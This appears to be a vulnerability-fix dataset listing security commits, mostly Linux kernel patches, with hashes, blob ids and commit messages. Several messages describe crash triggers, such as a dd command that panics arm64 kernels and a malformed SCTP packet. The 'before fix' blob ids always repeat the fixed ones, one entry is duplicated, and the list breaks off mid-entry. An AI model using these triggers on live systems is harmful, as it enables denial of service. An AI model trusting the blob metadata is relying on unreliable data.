libceph: do not hard code max auth ticket len\n\nWe hard code cephx auth ticket buffer size to 256 bytes.  This isn't enough for any moderate setups and, in case tickets themselves are not encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the buffer is allocated dynamically anyway, allocated it a bit later, at the point where we know how much is going to be needed.\n\nFixes: http://tracker.ceph.com/issues/8979\n\nCc: stable@vger.kernel.org Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com> Reviewed-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    c27a3e4d667fdcad3db7b104f75659478e0c68d8
File(s) In Commit: 
    net/ceph/auth_x.c
Blob(s) In Commit: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Blob(s) Before Fix: 
    de6662b14e1f5d7110ac1316c1362e4db6bffc5f
Projects:
    0-T-0_ps4-linux
Commit Message for c27a3e4d667fdcad3db7b104f75659478e0c68d8:
libceph: do not hard code max auth ticket len\n\nWe hard code cephx auth ticket buffer size to 256 bytes.  This isn't enough for any moderate setups and, in case tickets themselves are not encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the buffer is allocated dynamically anyway, allocated it a bit later, at the point where we know how much is going to be needed.\n\nFixes: http://tracker.ceph.com/issues/8979\n\nCc: stable@vger.kernel.org Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com> Reviewed-by: Sage Weil <sage@redhat.com>

======================================================================
Commit With Fix: 
    a701ceeb410bdda9d96c9d3d12104630df5d5b43
File(s) In Commit: 
    google-calendar-events/includes/misc-functions.php
Blob(s) In Commit: 
    d7c50983ac7b3ebb812c3bd9eab9922ba9ff4b1a
Blob(s) Before Fix: 
    d7c50983ac7b3ebb812c3bd9eab9922ba9ff4b1a
Projects:
    foria_WP-Google-Calendar-Events
Commit Message for a701ceeb410bdda9d96c9d3d12104630df5d5b43:
Added esc_html to ajax post values

======================================================================
Commit With Fix: 
    18f39e7be0121317550d03e267e3ebd4dbfbb3ce
File(s) In Commit: 
    fs/cifs/smb2pdu.c
Blob(s) In Commit: 
    240c627bc0c6619a55423428eec4c7b941365acf
Blob(s) Before Fix: 
    240c627bc0c6619a55423428eec4c7b941365acf
Projects:
    0-T-0_ps4-linux
Commit Message for 18f39e7be0121317550d03e267e3ebd4dbfbb3ce:
[CIFS] Possible null ptr deref in SMB2_tcon\n\nAs Raphael Geissert pointed out, tcon_error_exit can dereference tcon and there is one path in which tcon can be null.\n\nSigned-off-by: Steve French <smfrench@gmail.com> CC: Stable <stable@vger.kernel.org> # v3.7+ Reported-by: Raphael Geissert <geissert@debian.org>

======================================================================
Commit With Fix: 
    b751602d8cb7194ee62a61e085069679525138c4
File(s) In Commit: 
    lib/batch.js
Blob(s) In Commit: 
    e0cbabf2afd798c0dd3ae2434a669c916c249f43
Blob(s) Before Fix: 
    e0cbabf2afd798c0dd3ae2434a669c916c249f43
Projects:
    2fast2fourier_bassmaster
Commit Message for b751602d8cb7194ee62a61e085069679525138c4:
Remove eval statement

======================================================================
Commit With Fix: 
    43d1b6b266363ae7545d5d49851034eaeec7bebb
File(s) In Commit: 
    admin/themes/default/pages/manage_users.twig
Blob(s) In Commit: 
    6dca45cbd307b24c654953ba7d3197091c7bcab7
Blob(s) Before Fix: 
    6dca45cbd307b24c654953ba7d3197091c7bcab7
Projects:
    12345j_chyrp
Commit Message for 43d1b6b266363ae7545d5d49851034eaeec7bebb:
Fixed a potential XSS vulnerability.\n\nThanks JPCERT for reporting it to us.

======================================================================
Commit With Fix: 
    c88547a8119e3b581318ab65e9b72f27f23e641d
File(s) In Commit: 
    fs/xfs/xfs_da_btree.c
Blob(s) In Commit: 
    e69d57be866b7a86b589f4b3e0f1bc405a6419ec
Blob(s) Before Fix: 
    e69d57be866b7a86b589f4b3e0f1bc405a6419ec
Projects:
    0-T-0_ps4-linux
Commit Message for c88547a8119e3b581318ab65e9b72f27f23e641d:
xfs: fix directory hash ordering bug\n\nCommit f5ea1100 ("xfs: add CRCs to dir2/da node blocks") introduced in 3.10 incorrectly converted the btree hash index array pointer in xfs_da3_fixhashpath(). It resulted in the the current hash always being compared against the first entry in the btree rather than the current block index into the btree block's hash entry array. As a result, it was comparing the wrong hashes, and so could misorder the entries in the btree.\n\nFor most cases, this doesn't cause any problems as it requires hash collisions to expose the ordering problem. However, when there are hash collisions within a directory there is a very good probability that the entries will be ordered incorrectly and that actually matters when duplicate hashes are placed into or removed from the btree block hash entry array.\n\nThis bug results in an on-disk directory corruption and that results in directory verifier functions throwing corruption warnings into the logs. While no data or directory entries are lost, access to them may be compromised, and attempts to remove entries from a directory that has suffered from this corruption may result in a filesystem shutdown.  xfs_repair will fix the directory hash ordering without data loss occuring.\n\n[dchinner: wrote useful a commit message]\n\ncc: <stable@vger.kernel.org> Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Mark Tinguely <tinguely@sgi.com> Reviewed-by: Ben Myers <bpm@sgi.com> Signed-off-by: Dave Chinner <david@fromorbit.com>

======================================================================
Commit With Fix: 
    086ba77a6db00ed858ff07451bedee197df868c9
File(s) In Commit: 
    kernel/trace/trace_syscalls.c
Blob(s) In Commit: 
    29228c4d569692ea4234d880d13e94233b3e32f4
Blob(s) Before Fix: 
    29228c4d569692ea4234d880d13e94233b3e32f4
Projects:
    0-T-0_ps4-linux
Commit Message for 086ba77a6db00ed858ff07451bedee197df868c9:
tracing/syscalls: Ignore numbers outside NR_syscalls' range\n\nARM has some private syscalls (for example, set_tls(2)) which lie outside the range of NR_syscalls.  If any of these are called while syscall tracing is being performed, out-of-bounds array access will occur in the ftrace and perf sys_{enter,exit} handlers.\n\n # trace-cmd record -e raw_syscalls:* true && trace-cmd report  ...  true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)  true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264  true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)  true-653   [000]   384.675988: sys_exit:             NR 983045 = 0  ...\n\n # trace-cmd record -e syscalls:* true  [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace  [   17.289590] pgd = 9e71c000  [   17.289696] [aaaaaace] *pgd=00000000  [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM  [   17.290169] Modules linked in:  [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21  [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000  [   17.290747] PC is at ftrace_syscall_enter+0x48/0x1f8  [   17.290866] LR is at syscall_trace_enter+0x124/0x184\n\nFix this by ignoring out-of-NR_syscalls-bounds syscall numbers.\n\nCommit cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" added the check for less than zero, but it should have also checked for greater than NR_syscalls.\n\nLink: http://lkml.kernel.org/p/1414620418-29472-1-git-send-email-rabin@rab.in\n\nFixes: cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" Cc: stable@vger.kernel.org # 2.6.33+ Signed-off-by: Rabin Vincent <rabin@rab.in> Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    086ba77a6db00ed858ff07451bedee197df868c9
File(s) In Commit: 
    kernel/trace/trace_syscalls.c
Blob(s) In Commit: 
    29228c4d569692ea4234d880d13e94233b3e32f4
Blob(s) Before Fix: 
    29228c4d569692ea4234d880d13e94233b3e32f4
Projects:
    0-T-0_ps4-linux
Commit Message for 086ba77a6db00ed858ff07451bedee197df868c9:
tracing/syscalls: Ignore numbers outside NR_syscalls' range\n\nARM has some private syscalls (for example, set_tls(2)) which lie outside the range of NR_syscalls.  If any of these are called while syscall tracing is being performed, out-of-bounds array access will occur in the ftrace and perf sys_{enter,exit} handlers.\n\n # trace-cmd record -e raw_syscalls:* true && trace-cmd report  ...  true-653   [000]   384.675777: sys_enter:            NR 192 (0, 1000, 3, 4000022, ffffffff, 0)  true-653   [000]   384.675812: sys_exit:             NR 192 = 1995915264  true-653   [000]   384.675971: sys_enter:            NR 983045 (76f74480, 76f74000, 76f74b28, 76f74480, 76f76f74, 1)  true-653   [000]   384.675988: sys_exit:             NR 983045 = 0  ...\n\n # trace-cmd record -e syscalls:* true  [   17.289329] Unable to handle kernel paging request at virtual address aaaaaace  [   17.289590] pgd = 9e71c000  [   17.289696] [aaaaaace] *pgd=00000000  [   17.289985] Internal error: Oops: 5 [#1] PREEMPT SMP ARM  [   17.290169] Modules linked in:  [   17.290391] CPU: 0 PID: 704 Comm: true Not tainted 3.18.0-rc2+ #21  [   17.290585] task: 9f4dab00 ti: 9e710000 task.ti: 9e710000  [   17.290747] PC is at ftrace_syscall_enter+0x48/0x1f8  [   17.290866] LR is at syscall_trace_enter+0x124/0x184\n\nFix this by ignoring out-of-NR_syscalls-bounds syscall numbers.\n\nCommit cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" added the check for less than zero, but it should have also checked for greater than NR_syscalls.\n\nLink: http://lkml.kernel.org/p/1414620418-29472-1-git-send-email-rabin@rab.in\n\nFixes: cd0980fc8add "tracing: Check invalid syscall nr while tracing syscalls" Cc: stable@vger.kernel.org # 2.6.33+ Signed-off-by: Rabin Vincent <rabin@rab.in> Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    e40607cbe270a9e8360907cb1e62ddf0736e4864
File(s) In Commit: 
    net/sctp/sm_make_chunk.c
Blob(s) In Commit: 
    9f32741abb1c7b142265297dc2fac78b74b3d195
Blob(s) Before Fix: 
    9f32741abb1c7b142265297dc2fac78b74b3d195
Projects:
    0-T-0_ps4-linux
Commit Message for e40607cbe270a9e8360907cb1e62ddf0736e4864:
net: sctp: fix NULL pointer dereference in af->from_addr_param on malformed packet\n\nAn SCTP server doing ASCONF will panic on malformed INIT ping-of-death in the form of:\n\n  ------------ INIT[PARAM: SET_PRIMARY_IP] ------------>\n\nWhile the INIT chunk parameter verification dissects through many things in order to detect malformed input, it misses to actually check parameters inside of parameters. E.g. RFC5061, section 4.2.4 proposes a 'set primary IP address' parameter in ASCONF, which has as a subparameter an address parameter.\n\nSo an attacker may send a parameter type other than SCTP_PARAM_IPV4_ADDRESS or SCTP_PARAM_IPV6_ADDRESS, param_type2af() will subsequently return 0 and thus sctp_get_af_specific() returns NULL, too, which we then happily dereference unconditionally through af->from_addr_param().\n\nThe trace for the log:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000078 IP: [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp] PGD 0 Oops: 0000 [#1] SMP [...] Pid: 0, comm: swapper Not tainted 2.6.32-504.el6.x86_64 #1 Bochs Bochs RIP: 0010:[<ffffffffa01e9c62>]  [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp] [...] Call Trace:  <IRQ>  [<ffffffffa01f2add>] ? sctp_bind_addr_copy+0x5d/0xe0 [sctp]  [<ffffffffa01e1fcb>] sctp_sf_do_5_1B_init+0x21b/0x340 [sctp]  [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]  [<ffffffffa01e5c09>] ? sctp_endpoint_lookup_assoc+0xc9/0xf0 [sctp]  [<ffffffffa01e61f6>] sctp_endpoint_bh_rcv+0x116/0x230 [sctp]  [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]  [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]  [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]  [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0 [...]\n\nA minimal way to address this is to check for NULL as we do on all other such occasions where we know sctp_get_af_specific() could possibly return with NULL.\n\nFixes: d6de3097592b ("[SCTP]: Add the handling of "Set Primary IP Address" parameter to INIT") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a2b9e6c1a35afcc0973acb72e591c714e78885ff
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    e46da50e2cec51d56cbff2199c93a8656798e5cd
Blob(s) Before Fix: 
    e46da50e2cec51d56cbff2199c93a8656798e5cd
Projects:
    0-T-0_ps4-linux
Commit Message for a2b9e6c1a35afcc0973acb72e591c714e78885ff:
KVM: x86: Don't report guest userspace emulation error to userspace\n\nCommit fc3a9157d314 ("KVM: X86: Don't report L2 emulation failures to user-space") disabled the reporting of L2 (nested guest) emulation failures to userspace due to race-condition between a vmexit and the instruction emulator. The same rational applies also to userspace applications that are permitted by the guest OS to access MMIO area or perform PIO.\n\nThis patch extends the current behavior - of injecting a #UD instead of reporting it to userspace - also for guest userspace code.\n\nSigned-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    97fc15436b36ee3956efad83e22a557991f7d19d
File(s) In Commit: 
    arch/arm64/lib/clear_user.S
Blob(s) In Commit: 
    c17967fdf5f6007330ba65beb7a05bd347600764
Blob(s) Before Fix: 
    c17967fdf5f6007330ba65beb7a05bd347600764
Projects:
    0-T-0_ps4-linux
Commit Message for 97fc15436b36ee3956efad83e22a557991f7d19d:
arm64: __clear_user: handle exceptions on strb\n\nARM64 currently doesn't fix up faults on the single-byte (strb) case of __clear_user... which means that we can cause a nasty kernel panic as an ordinary user with any multiple PAGE_SIZE+1 read from /dev/zero. i.e.: dd if=/dev/zero of=foo ibs=1 count=1 (or ibs=65537, etc.)\n\nThis is a pretty obscure bug in the general case since we'll only __do_kernel_fault (since there's no extable entry for pc) if the mmap_sem is contended. However, with CONFIG_DEBUG_VM enabled, we'll always fault.\n\nif (!down_read_trylock(&mm->mmap_sem)) { 	if (!user_mode(regs) && !search_exception_tables(regs->pc)) 		goto no_context  retry: 	down_read(&mm->mmap_sem)  } else { 	/* 	 * The above down_read_trylock() might have succeeded in 	 * which 	 * case, we'll have missed the might_sleep() from 	 * down_read(). 	 */ 	might_sleep()  	if (!user_mode(regs) && !search_exception_tables(regs->pc)) 		goto no_context  }\n\nFix that by adding an extable entry for the strb instruction, since it touches user memory, similar to the other stores in __clear_user.\n\nSigned-off-by: Kyle McMartin <kyle@redhat.com> Reported-by: Miloš Prchlík <mprchlik@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Catalin Marinas <catalin.marinas@arm.com>

======================================================================
Commit With Fix: 
    41bdc78544b8a93a9c6814b8bbbfef966272abbe
File(s) In Commit: 
    arch/x86/kernel/tls.c
Blob(s) In Commit: 
    e7650bd71109af8819e9cb2c7479a2162353f917
Blob(s) Before Fix: 
    e7650bd71109af8819e9cb2c7479a2162353f917
Projects:
    0-T-0_ps4-linux
Commit Message for 41bdc78544b8a93a9c6814b8bbbfef966272abbe:
x86/tls: Validate TLS entries to protect espfix\n\nInstalling a 16-bit RW data segment into the GDT defeats espfix. AFAICT this will not affect glibc, Wine, or dosemu at all.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Acked-by: H. Peter Anvin <hpa@zytor.com> Cc: stable@vger.kernel.org Cc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: security@kernel.org <security@kernel.org> Cc: Willy Tarreau <w@1wt.eu> Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    db29a9508a9246e77087c5531e45b2c88ec6988b
File(s) In Commit: 
    net/netfilter/nf_conntrack_proto_generic.c
Blob(s) In Commit: 
    957c1db6665254645f43d0c04456015a1d4df65c
Blob(s) Before Fix: 
    957c1db6665254645f43d0c04456015a1d4df65c
Projects:
    0-T-0_ps4-linux
Commit Message for db29a9508a9246e77087c5531e45b2c88ec6988b:
netfilter: conntrack: disable generic tracking for known protocols\n\nGiven following iptables ruleset:\n\n-P FORWARD DROP -A FORWARD -m sctp --dport 9 -j ACCEPT -A FORWARD -p tcp --dport 80 -j ACCEPT -A FORWARD -p tcp -m conntrack -m state ESTABLISHED,RELATED -j ACCEPT\n\nOne would assume that this allows SCTP on port 9 and TCP on port 80. Unfortunately, if the SCTP conntrack module is not loaded, this allows *all* SCTP communication, to pass though, i.e. -p sctp -j ACCEPT, which we think is a security issue.\n\nThis is because on the first SCTP packet on port 9, we create a dummy "generic l4" conntrack entry without any port information (since conntrack doesn't know how to extract this information).\n\nAll subsequent packets that are unknown will then be in established state since they will fallback to proto_generic and will match the 'generic' entry.\n\nOur originally proposed version [1] completely disabled generic protocol tracking, but Jozsef suggests to not track protocols for which a more suitable helper is available, hence we now mitigate the issue for in tree known ct protocol helpers only, so that at least NAT and direction information will still be preserved for others.\n\n [1] http://www.spinics.net/lists/netfilter-devel/msg33430.html\n\nJoint work with Daniel Borkmann.\n\nSigned-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    ee53664bda169f519ce3c6a22d378f0b946c8178
File(s) In Commit: 
    include/asm-generic/pgtable.h
Blob(s) In Commit: 
    db09234589409760b91cb9e696472a3e828476f9
Blob(s) Before Fix: 
    db09234589409760b91cb9e696472a3e828476f9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ee53664bda169f519ce3c6a22d378f0b946c8178:
mm: Fix NULL pointer dereference in madvise(MADV_WILLNEED) support\n\nSasha Levin found a NULL pointer dereference that is due to a missing page table lock, which in turn is due to the pmd entry in question being a transparent huge-table entry.\n\nThe code - introduced in commit 1998cc048901 ("mm: make madvise(MADV_WILLNEED) support swap file prefetch") - correctly checks for this situation using pmd_none_or_trans_huge_or_clear_bad(), but it turns out that that function doesn't work correctly.\n\npmd_none_or_trans_huge_or_clear_bad() expected that pmd_bad() would trigger if the transparent hugepage bit was set, but it doesn't do that if pmd_numa() is also set. Note that the NUMA bit only gets set on real NUMA machines, so people trying to reproduce this on most normal development systems would never actually trigger this.\n\nFix it by removing the very subtle (and subtly incorrect) expectation, and instead just checking pmd_trans_huge() explicitly.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com> Acked-by: Andrea Arcangeli <aarcange@redhat.com> [ Additionally remove the now stale test for pmd_trans_huge() inside the   pmd_bad() case - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    470990fee0182566d439ef7e82d1abf18b7085d7
File(s) In Commit: 
    ssl/d1_lib.c
Blob(s) In Commit: 
    7d9d91ff2c34bc7af74acd3437578ce91abed5b8
Blob(s) Before Fix: 
    7d9d91ff2c34bc7af74acd3437578ce91abed5b8
Projects:
    0902710055_openssl
Commit Message for 470990fee0182566d439ef7e82d1abf18b7085d7:
Free up s->d1->buffered_app_data.q properly.\n\nPR#3286

======================================================================
Commit With Fix: 
    ff70494dd389ba570dbdbf36f217c28d4381c6b5
File(s) In Commit: 
    src/airodump-ng.c
Blob(s) In Commit: 
    222492c0d04dc02e748687ae2b4d4cdd2a78bf5d
Blob(s) Before Fix: 
    222492c0d04dc02e748687ae2b4d4cdd2a78bf5d
Projects:
    0x0mar_aircrack-ng
Commit Message for ff70494dd389ba570dbdbf36f217c28d4381c6b5:
Airodump-ng: Fixed GPS stack overflow (Closes #13 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2416 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    091b153f294b9b695b0b2831e65936438b550d7b
File(s) In Commit: 
    src/aireplay-ng.c
Blob(s) In Commit: 
    b3970151267cc15d58e722a251a6a54b507836eb
Blob(s) Before Fix: 
    b3970151267cc15d58e722a251a6a54b507836eb
Projects:
    0x0mar_aircrack-ng
Commit Message for 091b153f294b9b695b0b2831e65936438b550d7b:
Aireplay-ng: Fixed tcp_test stack overflow (Closes #14 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2417 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    da087238963c1239fdabd47dc1b65279605aca70
File(s) In Commit: 
    src/buddy-ng.c
Blob(s) In Commit: 
    8da8996d402bf1674bc79c25ff4e07378f81c8df
Blob(s) Before Fix: 
    8da8996d402bf1674bc79c25ff4e07378f81c8df
Projects:
    0x0mar_aircrack-ng
Commit Message for da087238963c1239fdabd47dc1b65279605aca70:
Buddy-ng: Fixed segmentation fault (Closes #15 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2418 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    88702a3ce4c28a973bf69023cd0312f412f6193e
File(s) In Commit: 
    src/osdep/network.c
Blob(s) In Commit: 
    4ebfaf414a2dd4742c59cc2c2d1de1f99bb1d4f9
Blob(s) Before Fix: 
    4ebfaf414a2dd4742c59cc2c2d1de1f99bb1d4f9
Projects:
    0x0mar_aircrack-ng
Commit Message for 88702a3ce4c28a973bf69023cd0312f412f6193e:
OSdep: Fixed segmentation fault that happens with a malicious server sending a negative length (Closes #16 on GitHub).\n\ngit-svn-id: http://svn.aircrack-ng.org/trunk@2419 28c6078b-6c39-48e3-add9-af49d547ecab

======================================================================
Commit With Fix: 
    3d32e4dbe71374a6780eaf51d719d76f9a9bf22f
File(s) In Commit: 
    virt/kvm/iommu.c
Blob(s) In Commit: 
    c1e6ae989a432165f9d6871626929ed2ecb578e8
Blob(s) Before Fix: 
    c1e6ae989a432165f9d6871626929ed2ecb578e8
Projects:
    0-T-0_ps4-linux
Commit Message for 3d32e4dbe71374a6780eaf51d719d76f9a9bf22f:
kvm: fix excessive pages un-pinning in kvm_iommu_map error path.\n\nThe third parameter of kvm_unpin_pages() when called from kvm_iommu_map_pages() is wrong, it should be the number of pages to un-pin and not the page size.\n\nThis error was facilitated with an inconsistent API: kvm_pin_pages() takes a size, but kvn_unpin_pages() takes a number of pages, so fix the problem by matching the two.\n\nThis was introduced by commit 350b8bd ("kvm: iommu: fix the third parameter of kvm_iommu_put_pages (CVE-2014-3601)"), which fixes the lack of un-pinning for pages intended to be un-pinned (i.e. memory leak) but unfortunately potentially aggravated the number of pages we un-pin that should have stayed pinned. As far as I understand though, the same practical mitigations apply.\n\nThis issue was found during review of Red Hat 6.6 patches to prepare Ksplice rebootless updates.\n\nThanks to Vegard for his time on a late Friday evening to help me in understanding this code.\n\nFixes: 350b8bd ("kvm: iommu: fix the third parameter of... (CVE-2014-3601)") Cc: stable@vger.kernel.org Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Signed-off-by: Jamie Iles <jamie.iles@oracle.com> Reviewed-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    d2e91c118f6128875274a638007702d1cc665893
File(s) In Commit: 
    data/org.freedesktop.systemd1.conf
Blob(s) In Commit: 
    a07a8e1ce3191c087c700540dc48738d8cce3a61
Blob(s) Before Fix: 
    a07a8e1ce3191c087c700540dc48738d8cce3a61
Projects:
    desrt_systemd-shim
Commit Message for d2e91c118f6128875274a638007702d1cc665893:
security policy: remove clause for Abandon call\n\nI committed this after copying it out of a work-in-progress branch that was being worked on by Serge.  I didn't realise that it was most likely only ever intended to be for debugging purposes.\n\nAccording to Martin and Stéphane this is not needed and is a potential security problem.  Let's close that hole.

======================================================================
Commit With Fix: 
    3f6f1480d86bf9fc16c160d803ab1d006e3058d5
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    749f9fa3825422adb9a3cc9a5867f52ec256dedd
Blob(s) Before Fix: 
    749f9fa3825422adb9a3cc9a5867f52ec256dedd
Projects:
    0-T-0_ps4-linux
Commit Message for 3f6f1480d86bf9fc16c160d803ab1d006e3058d5:
KVM: x86: PREFETCH and HINT_NOP should have SrcMem flag\n\nThe decode phase of the x86 emulator assumes that every instruction with the ModRM flag, and which can be used with RIP-relative addressing, has either SrcMem or DstMem.  This is not the case for several instructions - prefetch, hint-nop and clflush.\n\nAdding SrcMem|NoAccess for prefetch and hint-nop and SrcMem for clflush.\n\nThis fixes CVE-2014-8480.\n\nFixes: 41061cdb98a0bec464278b4db8e894a3121671f5 Cc: stable@vger.kernel.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    a430c9166312e1aa3d80bce32374233bdbfeba32
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    eb3b1c46f995d17b242ff5d80d2cdc6d87336d0d
Blob(s) Before Fix: 
    eb3b1c46f995d17b242ff5d80d2cdc6d87336d0d
Projects:
    0-T-0_ps4-linux
Commit Message for a430c9166312e1aa3d80bce32374233bdbfeba32:
KVM: emulate: avoid accessing NULL ctxt->memopp\n\nA failure to decode the instruction can cause a NULL pointer access. This is fixed simply by moving the "done" label as close as possible to the return.\n\nThis fixes CVE-2014-8481.\n\nReported-by: Andy Lutomirski <luto@amacapital.net> Cc: stable@vger.kernel.org Fixes: 41061cdb98a0bec464278b4db8e894a3121671f5 Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    8b5ecd226f9208af3074b33d3b7cf5e14f55b138
File(s) In Commit: 
    src/core/cipher.cpp
Blob(s) In Commit: 
    7d1fe46a5e7be506d06310e188404bab8c8b8253
Blob(s) Before Fix: 
    7d1fe46a5e7be506d06310e188404bab8c8b8253
Projects:
    02JanDal_quassel
Commit Message for 8b5ecd226f9208af3074b33d3b7cf5e14f55b138:
Check for invalid input in encrypted buffers\n\nThe ECB Blowfish decryption function assumed that encrypted input would always come in blocks of 12 characters, as specified. However, buggy clients or annoying people may not adhere to that assumption, causing the core to crash while trying to process the invalid base64 input.\n\nWith this commit we make sure that we're not overstepping the bounds of the input string while decoding it  instead we bail out early and display the original input. Fixes #1314.\n\nThanks to Tucos for finding that one!

======================================================================
Commit With Fix: 
    f779e3d4394a0638d822849863c4098421d911c5
File(s) In Commit: 
    api/soap/mc_account_api.php
Blob(s) In Commit: 
    66d43d114a047d95655a0f5a617819717635e204
Blob(s) Before Fix: 
    66d43d114a047d95655a0f5a617819717635e204
Projects:
    01-Scripts_mantisbt
Commit Message for f779e3d4394a0638d822849863c4098421d911c5:
SOAP API: apply access control to mci_account_get_array_by_id\n\nThe access controls are the same as the ones applied by view_user_page.php, with the single addition of making the info available if the user requests their own information.\n\nThis preserves the behaviour of the mc_login method call.\n\nFixes #17243 (leak of user personal information)\n\nSigned-off-by: Damien Regad <dregad@mantisbt.org>

======================================================================
Commit With Fix: 
    0f5b4fd860fa7e3a6c47201637aab05395f32647
File(s) In Commit: 
    NEWS
Blob(s) In Commit: 
    3b342488c234a18949316932038005d0224d9b56
Blob(s) Before Fix: 
    3b342488c234a18949316932038005d0224d9b56
Projects:
    AzeemMalik51_mod_auth_mellon
Commit Message for 0f5b4fd860fa7e3a6c47201637aab05395f32647:
Add NEWS-file for 0.9.0.

======================================================================
Commit With Fix: 
    338f977f4eb441e69bb9a46eaa0ac715c931a67f
File(s) In Commit: 
    net/mac80211/tx.c
Blob(s) In Commit: 
    97a02d3f7d87720795e1518d27fce0bbaed9bc4f
Blob(s) Before Fix: 
    97a02d3f7d87720795e1518d27fce0bbaed9bc4f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 338f977f4eb441e69bb9a46eaa0ac715c931a67f:
mac80211: fix fragmentation code, particularly for encryption\n\nThe "new" fragmentation code (since my rewrite almost 5 years ago) erroneously sets skb->len rather than using skb_trim() to adjust the length of the first fragment after copying out all the others. This leaves the skb tail pointer pointing to after where the data originally ended, and thus causes the encryption MIC to be written at that point, rather than where it belongs: immediately after the data.\n\nThe impact of this is that if software encryption is done, then  a) encryption doesn't work for the first fragment, the connection     becomes unusable as the first fragment will never be properly     verified at the receiver, the MIC is practically guaranteed to     be wrong  b) we leak up to 8 bytes of plaintext (!) of the packet out into     the air\n\nThis is only mitigated by the fact that many devices are capable of doing encryption in hardware, in which case this can't happen as the tail pointer is irrelevant in that case. Additionally, fragmentation is not used very frequently and would normally have to be configured manually.\n\nFix this by using skb_trim() properly.\n\nCc: stable@vger.kernel.org Fixes: 2de8e0d999b8 ("mac80211: rewrite fragmentation") Reported-by: Jouni Malinen <j@w1.fi> Signed-off-by: Johannes Berg <johannes.berg@intel.com>

======================================================================
Commit With Fix: 
    f2e323ec96077642d397bb1c355def536d489d16
File(s) In Commit: 
    drivers/media/usb/ttusb-dec/ttusbdecfe.c
Blob(s) In Commit: 
    9c29552aedec2e7b1a08447619671cd65c170b77
Blob(s) Before Fix: 
    9c29552aedec2e7b1a08447619671cd65c170b77
Projects:
    0-T-0_ps4-linux
Commit Message for f2e323ec96077642d397bb1c355def536d489d16:
[media] ttusb-dec: buffer overflow in ioctl\n\nWe need to add a limit check here so we don't overflow the buffer.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    cabacdc291c251bfde0dc2a2c945c02cef41bf40
File(s) In Commit: 
